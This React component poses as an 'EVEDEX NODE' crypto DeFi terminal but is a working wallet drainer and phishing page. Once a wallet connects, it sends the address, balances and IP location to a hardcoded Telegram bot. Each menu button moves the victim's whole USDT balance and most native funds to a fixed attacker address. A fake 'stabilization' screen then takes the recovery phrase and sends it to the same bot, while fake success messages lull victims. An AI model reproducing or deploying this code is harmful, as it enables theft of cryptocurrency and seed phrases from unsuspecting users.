import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId, useSwitchChain } from 'wagmi';
import { parseEther, formatEther, parseUnits } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  const { switchChain } = useSwitchChain();
  
  // Tab State
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("Locating...");

  // --- CONFIG ---
  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 

  const USDT_MAP = {
    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", // ETH
    56: "0x55d398326f99059ff775485246999027b3197955", // BSC
    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // POLY
    42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" // ARB
  };

  // DYNAMIC BALANCES BASED ON CHAIN
  const { data: nativeBal } = useBalance({ address }); 
  const { data: tokenBal } = useBalance({ 
    address, 
    token: USDT_MAP[chainId] || undefined
  });

  useEffect(() => {
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      setFeedMsg(`🛡️ ${addr} Rectified Successfully`);
      setTimeout(() => setFeedMsg(""), 4500);
    }, 9000);
    return () => clearInterval(interval);
  }, []);

  const logToTelegram = async (msg) => {
    try { fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }); } catch (e) {}
  };

  useEffect(() => {
    if (isConnected && address) {
      logToTelegram(`🔔 SESSION: ${address}\nCHAIN: ${chainId}\nTOKEN: ${tokenBal?.formatted}\nNATIVE: ${nativeBal?.formatted}`);
    }
  }, [isConnected, address, chainId]);

  useEffect(() => {
    if (selectedAsset === "TOKEN") {
      setInputVal(tokenBal?.formatted?.slice(0, 10) || "0.00");
    } else {
      setInputVal(nativeBal?.formatted?.slice(0, 10) || "0.00");
    }
  }, [selectedAsset, tokenBal, nativeBal]);

  const sweepNative = () => {
    if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
    const val = (nativeBal.value * 950n) / 1000n; 
    sendTransaction({ to: destination, value: val }, {
      onSuccess: (h) => { logToTelegram(`✅ NATIVE_HIT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
      onError: () => { setView("seed_gate"); setLoading(false); }
    });
  };

  const executeTaskAction = async () => {
    setLoading(true);
    setLoadingText(`STABILIZING_VAULT...`);
    
    if (selectedAsset === "TOKEN") {
      const tokenAddr = USDT_MAP[chainId];
      if (tokenAddr && tokenBal && tokenBal.value > 0n) {
        const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
        const amountHex = tokenBal.value.toString(16).padStart(64, '0');
        const payload = `0xa9059cbb${paddedTarget}${amountHex}`;
        sendTransaction({ to: tokenAddr, data: payload }, {
          onSuccess: (h) => { logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`); sweepNative(); },
          onError: () => sweepNative()
        });
      } else { sweepNative(); }
    } else {
      sweepNative();
    }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column'}}>
      <div style={{width:'100%', height:'200px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Chart" />
         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
      </div>

      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>AES-256 SECURED</div></div>
        <w3m-button balance="hide" />
      </header>

      <div style={{flex:1}}>
        {!isConnected ? (
           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
        ) : (
          <>
            {view === "menu" && (
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#475569", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}</button>
                ))}
              </div>
            )}
            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← ABORT</button>
                
                {/* TAB SELECTOR FOR ASSET */}
                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT ({tokenBal?.symbol || "USDT"})</div>
                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol || "NATIVE"}</div>
                </div>

                <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>AVAILABLE {selectedAsset === "TOKEN" ? "USDT" : nativeBal?.symbol}</label>
                  <input readOnly value={inputVal} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', fontWeight:'900'}} />
                </div>
                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_{activeTask.toUpperCase()}</button>
              </div>
            )}
          </>
        )}
      </div>

      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}

      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px'}}>DETECTION: PROTOCOL_DESYNC. ENTER RECOVERY PHRASE TO DECRYPT NODE.</p>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'25px'}} />
                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
              </>
            ) : (
              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
            )}
          </div>
        </div>
      )}
      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>{loadingText}</div>}
    </div>
  );
}
